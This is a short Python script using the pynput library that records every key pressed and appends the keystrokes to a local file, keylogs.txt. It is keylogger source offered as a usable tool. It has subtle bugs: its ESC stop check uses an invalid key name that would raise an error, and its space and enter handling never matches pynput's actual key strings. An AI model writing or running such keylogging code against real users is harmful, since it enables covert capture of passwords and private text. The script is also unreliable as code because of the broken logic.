```python
import os
import time
from pynput import keyboard

# Store captured keystrokes in memory for incremental writing
keystrokes = ""

# Define the termination key (ESC)
terminate_key = '<esc>'

def on_press(key):
    global keystrokes

    # Handle special keys and regular keys separately
    if key == keyboard.Key[terminate_key]:
        return False  # stop the listener
    else:
        try:
            current_keystroke = str(key).replace("'", "")
            print(f"Captured keystroke: {current_keystroke}")  # optional debug print
            
            if current_keystroke == "space":  # space key handling
                keystrokes += "[SPACE]"
            elif current_keystroke == "enter":  # enter key handling
                keystrokes += "[ENTER]\n"
            else:  # for regular characters
                keystrokes += current_keystroke
        except AttributeError as e:  # handle potential errors due to special keys or key combinations
            print(f"Could not capture the following keystroke: {key}")
    write_to_file()  # write new captured keystrokes to the file

# Write captured keystrokes to the file incrementally
def write_to_file():
    global keystrokes
    try:
        with open("keylogs.txt", "a") as f:
            f.write(keystrokes)
        print("Keylog has been appended to keylogs.txt.")  # optional debug print
        keystrokes = ""  # reset captured keystrokes after writing to the file
    except Exception as e:
        print(f"An error occurred while trying to write to the file: {e}")

def on_release(key):
    pass  # do nothing for now - we only care about pressed keys in our use case
    
# Set up a listener to capture user keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # waiting for the termination key event
```
